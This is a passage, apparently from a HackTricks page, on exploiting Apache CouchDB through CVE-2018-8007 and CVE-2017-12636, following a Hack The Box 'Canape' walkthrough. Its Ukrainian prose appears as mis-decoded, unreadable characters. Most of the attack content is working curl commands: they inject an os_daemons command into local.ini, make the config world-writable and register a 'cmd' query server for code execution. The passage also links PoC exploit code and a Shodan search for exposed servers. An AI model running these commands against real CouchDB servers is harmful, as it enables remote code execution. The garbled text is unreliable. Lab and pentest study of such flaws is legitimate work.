root        744  0.0  0.0   4240   640 ?        Ss   Sep13   0:00 runsv couchdb
root        811  0.0  0.0   4384   800 ?        S    Sep13   0:00 svlogd -tt /var/log/couchdb
homer       815  0.4  3.4 649348 34524 ?        Sl   Sep13   5:33 /home/homer/bin/../erts-7.3/bin/beam -K true -A 16 -Bd -- -root /home/homer/b
```
–î–ª—è —Ç–∏—Ö, —Ö—Ç–æ –∑–∞—Ü—ñ–∫–∞–≤–ª–µ–Ω–∏–π —É —Ä–æ–∑—É–º—ñ–Ω–Ω—ñ —Ç–æ–≥–æ, —è–∫ —Ü–µ–π "cookie" –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∏–π –¥–ª—è –≤—ñ–¥–¥–∞–ª–µ–Ω–æ–≥–æ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–¥—É (RCE) –≤ –∫–æ–Ω—Ç–µ–∫—Å—Ç—ñ —Å–∏—Å—Ç–µ–º Erlang, –¥–æ—Å—Ç—É–ø–Ω–∏–π —Å–ø–µ—Ü—ñ–∞–ª—å–Ω–∏–π —Ä–æ–∑–¥—ñ–ª –¥–ª—è –ø–æ–¥–∞–ª—å—à–æ–≥–æ —á–∏—Ç–∞–Ω–Ω—è. –í—ñ–Ω –¥–µ—Ç–∞–ª—å–Ω–æ –æ–ø–∏—Å—É—î –º–µ—Ç–æ–¥–æ–ª–æ–≥—ñ—ó –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è cookie Erlang –Ω–µ—Å–∞–Ω–∫—Ü—ñ–æ–Ω–æ–≤–∞–Ω–∏–º–∏ —Å–ø–æ—Å–æ–±–∞–º–∏ –¥–ª—è –¥–æ—Å—è–≥–Ω–µ–Ω–Ω—è –∫–æ–Ω—Ç—Ä–æ–ª—é –Ω–∞–¥ —Å–∏—Å—Ç–µ–º–∞–º–∏. –í–∏ –º–æ–∂–µ—Ç–µ **[–¥–æ—Å–ª—ñ–¥–∏—Ç–∏ –¥–µ—Ç–∞–ª—å–Ω–∏–π –ø–æ—Å—ñ–±–Ω–∏–∫ –∑ –∑–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è cookie Erlang –¥–ª—è RCE —Ç—É—Ç](4369-pentesting-erlang-port-mapper-daemon-epmd.md#erlang-cookie-rce)**.

### **–ï–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è CVE-2018-8007 —á–µ—Ä–µ–∑ –º–æ–¥–∏—Ñ—ñ–∫–∞—Ü—ñ—é local.ini**

–ü—Ä–∏–∫–ª–∞–¥ [–∑–≤—ñ–¥—Å–∏](https://0xdf.gitlab.io/2018/09/15/htb-canape.html).

–ù–µ–¥–∞–≤–Ω–æ —Ä–æ–∑–∫—Ä–∏—Ç–∞ –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å, CVE-2018-8007, —â–æ –≤–ø–ª–∏–≤–∞—î –Ω–∞ Apache CouchDB, –±—É–ª–∞ –¥–æ—Å–ª—ñ–¥–∂–µ–Ω–∞, –≤–∏—è–≤–∏–≤—à–∏, —â–æ –¥–ª—è –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó –ø–æ—Ç—Ä—ñ–±–Ω—ñ –ø—Ä–∞–≤–∞ –Ω–∞ –∑–∞–ø–∏—Å –¥–æ —Ñ–∞–π–ª—É `local.ini`. –•–æ—á–∞ —Ü–µ –Ω–µ –±—É–ª–æ –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ –∑–∞—Å—Ç–æ—Å–æ–≤–Ω–æ –¥–æ –ø–æ—á–∞—Ç–∫–æ–≤–æ—ó —Ü—ñ–ª—å–æ–≤–æ—ó —Å–∏—Å—Ç–µ–º–∏ —á–µ—Ä–µ–∑ –æ–±–º–µ–∂–µ–Ω–Ω—è –±–µ–∑–ø–µ–∫–∏, –±—É–ª–∏ –≤–Ω–µ—Å–µ–Ω—ñ –∑–º—ñ–Ω–∏, —â–æ–± –Ω–∞–¥–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –Ω–∞ –∑–∞–ø–∏—Å –¥–æ —Ñ–∞–π–ª—É `local.ini` –¥–ª—è —Ü—ñ–ª–µ–π –¥–æ—Å–ª—ñ–¥–∂–µ–Ω–Ω—è. –ù–∏–∂—á–µ –Ω–∞–≤–µ–¥–µ–Ω—ñ –¥–µ—Ç–∞–ª—å–Ω—ñ –∫—Ä–æ–∫–∏ —Ç–∞ –ø—Ä–∏–∫–ª–∞–¥–∏ –∫–æ–¥—É, —â–æ –¥–µ–º–æ–Ω—Å—Ç—Ä—É—é—Ç—å –ø—Ä–æ—Ü–µ—Å.

–°–ø–æ—á–∞—Ç–∫—É —Å–µ—Ä–µ–¥–æ–≤–∏—â–µ –≥–æ—Ç—É—î—Ç—å—Å—è, –∑–∞–±–µ–∑–ø–µ—á—É—é—á–∏, —â–æ–± —Ñ–∞–π–ª `local.ini` –±—É–≤ –∑–∞–ø–∏—Å—É–≤–∞–Ω–∏–º, —â–æ –ø–µ—Ä–µ–≤—ñ—Ä—è—î—Ç—å—Å—è —à–ª—è—Ö–æ–º –ø–µ—Ä–µ–ª—ñ–∫—É –ø—Ä–∞–≤:
```bash
root@canape:/home/homer/etc# ls -l
-r--r--r-- 1 homer homer 18477 Jan 20  2018 default.ini
-rw-rw-rw- 1 homer homer  4841 Sep 14 17:39 local.ini
-r--r--r-- 1 root  root   4841 Sep 14 14:30 local.ini.bk
-r--r--r-- 1 homer homer  1345 Jan 14  2018 vm.args
```
–©–æ–± –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏ –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å, –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è –∫–æ–º–∞–Ω–¥–∞ curl, –Ω–∞—Ü—ñ–ª–µ–Ω–∞ –Ω–∞ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—é `cors/origins` —É `local.ini`. –¶–µ —ñ–Ω–∂–µ–∫—Ç—É—î –Ω–æ–≤–∏–π –ø–æ—Ö–æ–¥–∂–µ–Ω–Ω—è —Ä–∞–∑–æ–º –∑ –¥–æ–¥–∞—Ç–∫–æ–≤–∏–º–∏ –∫–æ–º–∞–Ω–¥–∞–º–∏ –≤ —Å–µ–∫—Ü—ñ—é `[os_daemons]`, –∑ –º–µ—Ç–æ—é –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –¥–æ–≤—ñ–ª—å–Ω–æ–≥–æ –∫–æ–¥—É:
```bash
www-data@canape:/dev/shm$ curl -X PUT 'http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/cors/origins' -H "Accept: application/json" -H "Content-Type: application/json" -d "0xdf\n\n[os_daemons]\ntestdaemon = /usr/bin/touch /tmp/0xdf"
```
–ü–æ–¥–∞–ª—å—à–∞ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∞ –ø–æ–∫–∞–∑—É—î —ñ–Ω'—î–∫–æ–≤–∞–Ω—É –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—é –≤ `local.ini`, –∫–æ–Ω—Ç—Ä–∞—Å—Ç—É—é—á–∏ —ó—ó –∑ —Ä–µ–∑–µ—Ä–≤–Ω–æ—é –∫–æ–ø—ñ—î—é, —â–æ–± –ø—ñ–¥–∫—Ä–µ—Å–ª–∏—Ç–∏ –∑–º—ñ–Ω–∏:
```bash
root@canape:/home/homer/etc# diff local.ini local.ini.bk
119,124d118
< [cors]
< origins = 0xdf
< [os_daemons]
< test_daemon = /usr/bin/touch /tmp/0xdf
```
–°–ø–æ—á–∞—Ç–∫—É –æ—á—ñ–∫—É–≤–∞–Ω–∏–π —Ñ–∞–π–ª (`/tmp/0xdf`) –Ω–µ —ñ—Å–Ω—É—î, —â–æ –≤–∫–∞–∑—É—î –Ω–∞ —Ç–µ, —â–æ —ñ–Ω'—î–∫–æ–≤–∞–Ω–∞ –∫–æ–º–∞–Ω–¥–∞ —â–µ –Ω–µ –±—É–ª–∞ –≤–∏–∫–æ–Ω–∞–Ω–∞. –ü–æ–¥–∞–ª—å—à–µ —Ä–æ–∑—Å–ª—ñ–¥—É–≤–∞–Ω–Ω—è –≤–∏—è–≤–ª—è—î, —â–æ –∑–∞–ø—É—â–µ–Ω—ñ –ø—Ä–æ—Ü–µ—Å–∏, –ø–æ–≤'—è–∑–∞–Ω—ñ –∑ CouchDB, –≤–∫–ª—é—á–∞—é—á–∏ –æ–¥–∏–Ω, —è–∫–∏–π –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ –º–æ–∂–µ –≤–∏–∫–æ–Ω–∞—Ç–∏ —ñ–Ω'—î–∫–æ–≤–∞–Ω—É –∫–æ–º–∞–Ω–¥—É:
```bash
root@canape:/home/homer/bin# ps aux | grep couch
```
–ó–∞–≤–µ—Ä—à–∏–≤—à–∏ –≤–∏—è–≤–ª–µ–Ω–∏–π –ø—Ä–æ—Ü–µ—Å CouchDB —ñ –¥–æ–∑–≤–æ–ª–∏–≤—à–∏ —Å–∏—Å—Ç–µ–º—ñ –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ –ø–µ—Ä–µ–∑–∞–ø—É—Å—Ç–∏—Ç–∏ –π–æ–≥–æ, –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è —ñ–Ω'—î–∫–æ–≤–∞–Ω–∞ –∫–æ–º–∞–Ω–¥–∞, —â–æ –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂—É—î—Ç—å—Å—è –Ω–∞—è–≤–Ω—ñ—Å—Ç—é —Ä–∞–Ω—ñ—à–µ –≤—ñ–¥—Å—É—Ç–Ω—å–æ–≥–æ —Ñ–∞–π–ª—É:
```bash
root@canape:/home/homer/etc# kill 711
root@canape:/home/homer/etc# ls /tmp/0xdf
/tmp/0xdf
```
–¶–µ –¥–æ—Å–ª—ñ–¥–∂–µ–Ω–Ω—è –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂—É—î –∂–∏—Ç—Ç—î–∑–¥–∞—Ç–Ω—ñ—Å—Ç—å –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó CVE-2018-8007 –∑–∞ –ø–µ–≤–Ω–∏—Ö —É–º–æ–≤, –∑–æ–∫—Ä–µ–º–∞ –≤–∏–º–æ–≥—É –Ω–∞—è–≤–Ω–æ—Å—Ç—ñ –ø—Ä–∞–≤ –Ω–∞ –∑–∞–ø–∏—Å –¥–æ —Ñ–∞–π–ª—É `local.ini`. –ù–∞–≤–µ–¥–µ–Ω—ñ –ø—Ä–∏–∫–ª–∞–¥–∏ –∫–æ–¥—É —Ç–∞ –ø—Ä–æ—Ü–µ–¥—É—Ä–Ω—ñ –∫—Ä–æ–∫–∏ –ø—Ä–æ–ø–æ–Ω—É—é—Ç—å —á—ñ—Ç–∫–∏–π –ø–æ—Å—ñ–±–Ω–∏–∫ –¥–ª—è –≤—ñ–¥—Ç–≤–æ—Ä–µ–Ω–Ω—è –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó –≤ –∫–æ–Ω—Ç—Ä–æ–ª—å–æ–≤–∞–Ω–æ–º—É —Å–µ—Ä–µ–¥–æ–≤–∏—â—ñ.

–î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø—Ä–æ CVE-2018-8007, –∑–≤–µ—Ä–Ω—ñ—Ç—å—Å—è –¥–æ —Ä–µ–∫–æ–º–µ–Ω–¥–∞—Ü—ñ–π mdsec: [CVE-2018-8007](https://www.mdsec.co.uk/2018/08/advisory-cve-2018-8007-apache-couchdb-remote-code-execution/).

### **–î–æ—Å–ª—ñ–¥–∂–µ–Ω–Ω—è CVE-2017-12636 –∑ –ø—Ä–∞–≤–∞–º–∏ –Ω–∞ –∑–∞–ø–∏—Å —É local.ini**

–ü—Ä–∏–∫–ª–∞–¥ [–∑–≤—ñ–¥—Å–∏](https://0xdf.gitlab.io/2018/09/15/htb-canape.html).

–í—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å, –≤—ñ–¥–æ–º–∞ —è–∫ CVE-2017-12636, –±—É–ª–∞ –¥–æ—Å–ª—ñ–¥–∂–µ–Ω–∞, —â–æ –¥–æ–∑–≤–æ–ª—è—î –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–¥—É —á–µ—Ä–µ–∑ –ø—Ä–æ—Ü–µ—Å CouchDB, —Ö–æ—á–∞ –ø–µ–≤–Ω—ñ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó –º–æ–∂—É—Ç—å –ø–µ—Ä–µ—à–∫–æ–¥–∂–∞—Ç–∏ —ó—ó –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó. –ù–µ–∑–≤–∞–∂–∞—é—á–∏ –Ω–∞ —á–∏—Å–ª–µ–Ω–Ω—ñ –ø–æ—Å–∏–ª–∞–Ω–Ω—è –Ω–∞ Proof of Concept (POC), –¥–æ—Å—Ç—É–ø–Ω—ñ –≤ –Ü–Ω—Ç–µ—Ä–Ω–µ—Ç—ñ, –Ω–µ–æ–±—Ö—ñ–¥–Ω—ñ –∫–æ—Ä–∏–≥—É–≤–∞–Ω–Ω—è –¥–ª—è –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ –Ω–∞ –≤–µ—Ä—Å—ñ—ó CouchDB 2, —è–∫–∞ –≤—ñ–¥—Ä—ñ–∑–Ω—è—î—Ç—å—Å—è –≤—ñ–¥ –∑–∞–∑–≤–∏—á–∞–π –Ω–∞—Ü—ñ–ª–µ–Ω–æ—ó –≤–µ—Ä—Å—ñ—ó 1.x. –ü–æ—á–∞—Ç–∫–æ–≤—ñ –∫—Ä–æ–∫–∏ –≤–∫–ª—é—á–∞—é—Ç—å –ø–µ—Ä–µ–≤—ñ—Ä–∫—É –≤–µ—Ä—Å—ñ—ó CouchDB —Ç–∞ –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è –≤—ñ–¥—Å—É—Ç–Ω–æ—Å—Ç—ñ –æ—á—ñ–∫—É–≤–∞–Ω–æ–≥–æ —à–ª—è—Ö—É —Å–µ—Ä–≤–µ—Ä—ñ–≤ –∑–∞–ø–∏—Ç—ñ–≤:
```bash
curl http://localhost:5984
curl http://0xdf:df@localhost:5984/_config/query_servers/
```
–©–æ–± –ø—ñ–¥—Ç—Ä–∏–º–∞—Ç–∏ –≤–µ—Ä—Å—ñ—é CouchDB 2.0, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –Ω–æ–≤–∏–π —à–ª—è—Ö:
```bash
curl 'http://0xdf:df@localhost:5984/_membership'
curl http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/query_servers
```
–°–ø—Ä–æ–±–∏ –¥–æ–¥–∞—Ç–∏ —Ç–∞ –≤–∏–∫–ª–∏–∫–∞—Ç–∏ –Ω–æ–≤–∏–π —Å–µ—Ä–≤–µ—Ä –∑–∞–ø–∏—Ç—ñ–≤ –∑—É—Å—Ç—Ä—ñ–ª–∏—Å—è –∑ –ø–æ–º–∏–ª–∫–∞–º–∏, –ø–æ–≤'—è–∑–∞–Ω–∏–º–∏ –∑ –¥–æ–∑–≤–æ–ª–∞–º–∏, –ø—Ä–æ —â–æ —Å–≤—ñ–¥—á–∏—Ç—å –Ω–∞—Å—Ç—É–ø–Ω–∏–π –≤–∏—Ö—ñ–¥:
```bash
curl -X PUT 'http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/query_servers/cmd' -d '"/sbin/ifconfig > /tmp/df"'
```
–ü–æ–¥–∞–ª—å—à–µ —Ä–æ–∑—Å–ª—ñ–¥—É–≤–∞–Ω–Ω—è –≤–∏—è–≤–∏–ª–æ –ø—Ä–æ–±–ª–µ–º–∏ –∑ –¥–æ–∑–≤–æ–ª–∞–º–∏ –Ω–∞ —Ñ–∞–π–ª `local.ini`, —è–∫–∏–π –Ω–µ –º–æ–∂–Ω–∞ –±—É–ª–æ –∑–º—ñ–Ω–∏—Ç–∏. –ó–º—ñ–Ω–∏–≤—à–∏ –¥–æ–∑–≤–æ–ª–∏ —Ñ–∞–π–ª—É –∑ –¥–æ—Å—Ç—É–ø–æ–º root –∞–±–æ homer, —Å—Ç–∞–ª–æ –º–æ–∂–ª–∏–≤–∏–º –ø—Ä–æ–¥–æ–≤–∂–∏—Ç–∏:
```bash
cp /home/homer/etc/local.ini /home/homer/etc/local.ini.b
chmod 666 /home/homer/etc/local.ini
```
–ù–∞—Å—Ç—É–ø–Ω—ñ —Å–ø—Ä–æ–±–∏ –¥–æ–¥–∞—Ç–∏ —Å–µ—Ä–≤–µ—Ä –∑–∞–ø–∏—Ç—ñ–≤ –±—É–ª–∏ —É—Å–ø—ñ—à–Ω–∏–º–∏, –ø—Ä–æ —â–æ —Å–≤—ñ–¥—á–∏—Ç—å –≤—ñ–¥—Å—É—Ç–Ω—ñ—Å—Ç—å –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω—å –ø—Ä–æ –ø–æ–º–∏–ª–∫–∏ —É –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ. –£—Å–ø—ñ—à–Ω–∞ –º–æ–¥–∏—Ñ—ñ–∫–∞—Ü—ñ—è —Ñ–∞–π–ª—É `local.ini` –±—É–ª–∞ –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω–∞ —á–µ—Ä–µ–∑ –ø–æ—Ä—ñ–≤–Ω—è–Ω–Ω—è —Ñ–∞–π–ª—ñ–≤:
```bash
curl -X PUT 'http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/query_servers/cmd' -d '"/sbin/ifconfig > /tmp/df"'
```
–ü—Ä–æ—Ü–µ—Å –ø—Ä–æ–¥–æ–≤–∂–∏–≤—Å—è —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è–º –±–∞–∑–∏ –¥–∞–Ω–∏—Ö —Ç–∞ –¥–æ–∫—É–º–µ–Ω—Ç–∞, –ø—ñ—Å–ª—è —á–æ–≥–æ –±—É–ª–∞ —Å–ø—Ä–æ–±–∞ –≤–∏–∫–æ–Ω–∞—Ç–∏ –∫–æ–¥ —á–µ—Ä–µ–∑ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—Ü—å–∫–µ –≤—ñ–¥–æ–±—Ä–∞–∂–µ–Ω–Ω—è, —â–æ –≤—ñ–¥–æ–±—Ä–∞–∂–∞—î –Ω–æ–≤–æ—Å—Ç–≤–æ—Ä–µ–Ω–∏–π —Å–µ—Ä–≤–µ—Ä –∑–∞–ø–∏—Ç—ñ–≤:
```bash
curl -X PUT 'http://0xdf:df@localhost:5984/df'
curl -X PUT 'http://0xdf:df@localhost:5984/df/zero' -d '{"_id": "HTP"}'
curl -X PUT 'http://0xdf:df@localhost:5984/df/_design/zero' -d '{"_id": "_design/zero", "views": {"anything": {"map": ""} }, "language": "cmd"}'
```
A **[—Ä–µ–∑—é–º–µ](https://github.com/carlospolop/hacktricks/pull/116/commits/e505cc2b557610ef5cce09df6a14b10caf8f75a0)** –∑ –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω–∏–º payload –Ω–∞–¥–∞—î –¥–æ–¥–∞—Ç–∫–æ–≤—ñ –≤—ñ–¥–æ–º–æ—Å—Ç—ñ –ø—Ä–æ –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—é CVE-2017-12636 –∑–∞ –ø–µ–≤–Ω–∏—Ö —É–º–æ–≤. **–ö–æ—Ä–∏—Å–Ω—ñ —Ä–µ—Å—É—Ä—Å–∏** –¥–ª—è –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó —Ü—ñ—î—ó –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ –≤–∫–ª—é—á–∞—é—Ç—å:

- [POC exploit code](https://raw.githubusercontent.com/vulhub/vulhub/master/couchdb/CVE-2017-12636/exp.py)
- [Exploit Database entry](https://www.exploit-db.com/exploits/44913/)

## Shodan

* `port:5984 couchdb`

## References

* [https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html](https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html)
* [https://0xdf.gitlab.io/2018/09/15/htb-canape.html#couchdb-execution](https://0xdf.gitlab.io/2018/09/15/htb-canape.html#couchdb-execution)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
